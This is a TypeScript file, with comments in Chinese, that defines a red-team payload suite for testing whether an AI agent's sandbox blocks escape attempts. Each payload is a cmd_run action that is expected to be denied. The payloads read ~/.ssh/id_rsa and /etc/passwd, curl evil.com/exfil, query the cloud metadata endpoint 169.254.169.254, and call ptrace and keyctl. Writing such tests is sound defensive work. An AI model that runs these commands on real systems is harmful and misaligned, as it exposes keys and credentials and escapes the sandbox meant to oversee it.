/**
 * L0S-T14 — sandbox 逃逸红队 payload 定义
 *
 * 已知逃逸向量 payload 集（02-sandbox-security C1/C2/C5 score）：
 *   - fs-read: 读 ~/.ssh/id_rsa、cat /etc/passwd
 *   - egress:  curl evil.com、nslookup evil.com
 *   - metadata: curl http://169.254.169.254/latest/meta-data/
 *   - syscall: ptrace / keyctl（内核态逃逸向量）
 *
 * payload id 命名约定（ERRATA L0S-T14 / L0S-18）：id 含目标特征子串
 *（ssh / id_rsa / metadata / 169.254 / etc / passwd / evil 等），
 * 供测试与 canary 库按特征匹配定位。
 */

import type { Action } from "../actions/protocol.js";

export type EscapeCategory = "fs-read" | "egress" | "metadata" | "syscall";

export interface EscapePayload {
  /** id 含目标特征子串（ssh/metadata/etc/evil 等），便于 canary 库匹配。 */
  id: string;
  category: EscapeCategory;
  /** 红队 Action（cmd_run），经 backend.runVerify 在 sandbox 内运行。 */
  action: Action;
  /** spec 预期被阻断（true = 应被拒）。 */
  expectedDenied: boolean;
}

/**
 * 默认红队 payload 套件。
 *
 * 每个 payload 是一条 cmd_run Action；runAll 经 backend.runVerify 执行，
 * 捕获 exit code + EPERM / Connection refused 判定 escaped / epermHit。
 */
export function defaultPayloads(): EscapePayload[] {
  return [
    {
      id: "fs-read-ssh-id_rsa",
      category: "fs-read",
      action: {
        type: "cmd_run",
        tool_use_id: "redteam-ssh-read",
        command: "cat ~/.ssh/id_rsa",
        timeout_ms: 5000,
      },
      expectedDenied: true,
    },
    {
      id: "fs-read-etc-passwd",
      category: "fs-read",
      action: {
        type: "cmd_run",
        tool_use_id: "redteam-etc-passwd",
        command: "cat /etc/passwd",
        timeout_ms: 5000,
      },
      expectedDenied: true,
    },
    {
      id: "egress-evil-curl",
      category: "egress",
      action: {
        type: "cmd_run",
        tool_use_id: "redteam-evil-curl",
        command: "curl -sS http://evil.com/exfil",
        timeout_ms: 5000,
      },
      expectedDenied: true,
    },
    {
      id: "egress-evil-nslookup",
      category: "egress",
      action: {
        type: "cmd_run",
        tool_use_id: "redteam-evil-nslookup",
        command: "nslookup evil.com",
        timeout_ms: 5000,
      },
      expectedDenied: true,
    },
    {
      id: "metadata-169.254-curl",
      category: "metadata",
      action: {
        type: "cmd_run",
        tool_use_id: "redteam-metadata",
        command: "curl -sS http://169.254.169.254/latest/meta-data/",
        timeout_ms: 5000,
      },
      expectedDenied: true,
    },
    {
      id: "syscall-ptrace",
      category: "syscall",
      action: {
        type: "cmd_run",
        tool_use_id: "redteam-ptrace",
        command: "python3 -c 'import ctypes; ctypes.CDLL(None).ptrace(0,0,0)'",
        timeout_ms: 5000,
      },
      expectedDenied: true,
    },
    {
      id: "syscall-keyctl",
      category: "syscall",
      action: {
        type: "cmd_run",
        tool_use_id: "redteam-keyctl",
        command: "keyctl show @s",
        timeout_ms: 5000,
      },
      expectedDenied: true,
    },
  ];
}
